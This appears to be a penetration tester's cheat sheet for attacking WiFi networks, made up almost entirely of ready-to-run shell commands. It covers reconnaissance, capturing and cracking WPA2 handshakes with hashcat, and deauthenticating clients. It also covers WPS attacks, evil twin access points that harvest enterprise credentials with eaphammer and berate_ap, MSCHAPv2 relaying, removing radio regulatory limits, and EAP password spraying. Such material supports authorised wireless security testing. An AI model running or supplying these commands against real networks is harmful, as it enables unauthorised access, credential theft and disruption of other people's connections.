

#https://github.com/koutto/pi-pwnbox-rogueap#wifi-hacking-cheatsheets--mind-map
#https://raw.githubusercontent.com/koutto/pi-pwnbox-rogueap/main/mindmap/WiFi-Hacking-MindMap-v1.png
#https://github.com/koutto/pi-pwnbox-rogueap/wiki


iwconfig
airmon-ng start wlan0
#Recon 2G
airodump-ng wlan0mon
#Recon 5G
airodump-ng wlan0mon --band a


#Recon WPA-MGMT
#Choose one single channel if you want to have reliable capture
airodump-ng wlan0mon --essid-regex 'BLAH*' --band abg -c 140 -w BLAH-Wifi
#Inspect content of pcap file
#Extract Certificate from EAP coms
openssl x509 -in certificateServer.der -inform der -text

#Recon WPA2 PSK
#Find connected stations
airodump-ng wlan0mon --essid-regex 'BLAH*' --band abg -c 140 -w BLAH-Wifi
#Capture PMKID and EAPOL handshakes
hcxdumptool -i wlan1mon -o hcxdump11.pcapng --enable_status=1 -c 11 | tee hcxdumpChan11.out
hcxpcapngtool hcxdump1.pcapng -o wpa2psk.hashcat
#Crack with hashcat
hashcat -m 22000 ./wpa2psk.hashcat -a 0 /tmp/dico.tmp -r /rules/all.rule --session wifi-wpa -w3 -O
#Deauth client:
airmon-ng start wlan1
iwconfig wlan1mon channel 140
aireplay-ng --deauth 20 -c MAC:CLIENT -a MAC:AP wlan1mon
#Check for EAPOL in airodump

#Try WPS
wifite -i wlan1 --wps-only --bully


#Evil Twin
airmon-ng stop wlan0mon
cd /root/eaphammer-1.13.5/
sudo su
./eaphammer --cert-wizard
#Check radio regulations
iw reg get
#Remove radio regulations
iw reg set 00
#reset usb
usbreset
#
./eaphammer -i wlan0 --channel 36 --auth wpa-eap --essid BLAH_CORP --creds --bssid <fakeBSSID> --hw-mode a --mana
#Capture the packets exchanged during evilTwin
sudo tcpdump -i wlan0 -w evilTwinBLAH_CORP.pcap

#EvilTwin on OPEN network:
#hostile portal


#EvilTwin on EAP-TLS
berate_ap -c 1 --eap --mana-eaptls --mana-eapsuccess ...


#EvilTwin + MSCHAPv2 relay
berate_ap --eap --mana-wpe --wpa-sycophant --mana-credout eviltwinCreds.out wlan0 wlan1 <SSID>
./wpa_sycophant.sh -c wpa_sycophant.conf -i wlan


#EAP-PWD and WPA3
#rely on dragonfly handshakes
# check dragonblood

#connect to EAP-PEAP wifi network
#Add the following to a wpa_supplicant.conf file:
network={
        ssid="WIFI-CORP"
        scan_ssid=1
        key_mgmt=WPA-EAP
        eap=PEAP
        identity="myuser"
        password="Password123"
        phase1="peaplabel=0"
        phase2="auth=MSCHAPV2"
}
#For WPA2-PSK networks:
network={
        ssid="WIFI-Guest"
        scan_ssid=1
        key_mgmt=WPA-PSK-SHA256
	psk="Welcome123"
	ieee80211w=2
}
#Then open a screen and do
wpa_supplicant -c wpa_supplicant.conf -i wlan0
dhclient wlan0




##Password spraying
./eaphammer --eap-spray \
	--interface-pool wlan0 wlan1 \
	--essid <target_ESSID> \
	--password <password_to_spray> \
	--user-list <usernames_list> | tee eapspraying.out
